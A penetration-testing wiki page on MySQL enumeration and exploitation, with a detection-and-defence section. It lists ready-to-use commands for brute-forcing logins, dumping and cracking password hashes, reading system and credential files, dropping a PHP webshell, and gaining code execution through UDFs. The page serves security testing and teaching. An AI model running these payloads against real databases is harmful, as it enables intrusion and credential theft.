---
title: MySQL enumeration
slug: mysql-enum
---

> **TL;DR:** TCP/3306. Weak/blank root, `FILE` privilege for read/write to disk, UDF library load for RCE, and historical auth-bypass CVEs are the high-value primitives.

## What it is
MySQL (and the MariaDB fork) speak a custom binary protocol on TCP/3306. From an attacker view it is a credential-store-rich service that, once authenticated, exposes several escalation primitives: arbitrary file read/write via `LOAD DATA INFILE`/`SELECT ... INTO OUTFILE` (requires `FILE` privilege and `secure_file_priv` not set), library-backed user-defined functions for code execution, and historical pre-auth bugs like CVE-2012-2122 (memcmp auth bypass) and CVE-2016-6662 (config-injection root). Even without creds it leaks version, auth plugin, and salt material useful for offline cracking.

## Preconditions / where it applies
- TCP/3306 reachable. On managed clouds the public bind is often a misconfiguration.
- Default or weak `root@%` — historical installers, dev VMs, lab/staging boxes.
- `secure_file_priv` blank or pointing at a writable web path → file write → RCE.
- `FILE` privilege granted to a low-priv account → arbitrary read of `/etc/passwd`, `wp-config.php`, etc.
- Related: [[mssql-enum]], [[exposed-services]], [[password-spraying]].

## Technique
Banner + handshake:

```bash
nmap -sV -p3306 --script=mysql-info,mysql-empty-password,mysql-enum,mysql-brute,mysql-users TARGET
```

Auth and reconnaissance once you have a credential:

```sql
mysql -h TARGET -u root -p
> SELECT version(), current_user(), @@hostname, @@datadir, @@secure_file_priv;
> SHOW DATABASES;
> SELECT user, host, authentication_string, plugin FROM mysql.user;
> SHOW GRANTS FOR CURRENT_USER();
```

Arbitrary read (with `FILE`):

```sql
SELECT LOAD_FILE('/etc/passwd');
SELECT LOAD_FILE('/var/www/html/wp-config.php');
```

Webshell drop where MySQL runs as a user with write to a webroot and `secure_file_priv` is empty:

```sql
SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/s.php';
```

UDF RCE — upload a shared library to the plugin directory and register a function. Metasploit's `exploit/multi/mysql/mysql_udf_payload` or `raptor_udf2` automates the upload of a `lib_mysqludf_sys.so` and `CREATE FUNCTION sys_exec RETURNS int SONAME 'lib_mysqludf_sys.so';` then `SELECT sys_exec('id > /tmp/out');`. The plugin path comes from `SHOW VARIABLES LIKE 'plugin_dir';`.

Offline crack the password hashes from `mysql.user`:

```bash
hashcat -m 300 hash.txt rockyou.txt   # mysql4.1+ (mysql_native_password)
hashcat -m 11200 hash.txt rockyou.txt # caching_sha2 challenge-response
```

## Detection and defence
- MySQL general/audit log records failed logons, `LOAD_FILE`, `INTO OUTFILE`, `CREATE FUNCTION` — alert on any of these from app accounts.
- Bind to localhost or a private interface; require TLS; enforce `secure_file_priv` to a directory with no web/exec context; revoke `FILE` from everyone except DBAs.
- Disable `local_infile` to stop client-side file exfil via rogue server.
- Patch promptly; the auth-bypass and config-injection CVEs are old but still hit unpatched MariaDB/Percona builds on appliances.

## References
- [HackTricks — 3306 MySQL](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-mysql.html) — UDF RCE, file primitives, NSE scripts.
- [MySQL reference — secure_file_priv](https://dev.mysql.com/doc/refman/8.0/en/server-system-variables.html#sysvar_secure_file_priv) — official knob that breaks the file-write path.
- [PayloadsAllTheThings — MySQL](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection/MySQL%20Injection.md) — query snippets for file read/write and UDF chains.
